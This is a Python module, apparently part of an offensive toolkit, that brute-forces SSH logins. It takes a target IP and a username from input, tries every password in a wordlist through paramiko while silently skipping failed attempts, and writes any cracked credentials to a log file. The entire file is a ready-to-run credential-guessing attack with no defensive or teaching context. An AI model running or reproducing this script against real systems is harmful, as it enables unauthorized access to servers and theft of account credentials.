import paramiko
from utils.colors import color_text

def run():
    print(color_text("\n[+] Starting SSH Brute Force...\n", "cyan"))
    
    host = input("Enter SSH server IP address: ")
    username = input("Enter username to test: ")

    try:
        with open("wordlist.txt", "r", encoding="utf-8", errors="ignore") as f:
            for line in f:
                password = line.strip()
                try:
                    ssh = paramiko.SSHClient()
                    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    ssh.connect(host, username=username, password=password, timeout=5, banner_timeout=3)

                    print(color_text(f"[SUCCESS] Password found: {password}", "green"))

                    # Save result to success_log.txt
                    with open("success_log.txt", "w") as log:
                        log.write(f"Target: {host}\nUsername: {username}\nPassword: {password}\n")

                    ssh.close()
                    return
                except paramiko.AuthenticationException:
                    pass  # hide failed attempts
                except paramiko.SSHException as e:
                    print(color_text(f"[!] SSH Error: {e}", "red"))
                    break
                except Exception as e:
                    print(color_text(f"[!] Error: {e}", "red"))
                    break
    except FileNotFoundError:
        print(color_text("[-] wordlist.txt not found!", "red"))
    except PermissionError:
        print(color_text("[-] wordlist.txt is not readable.", "red"))
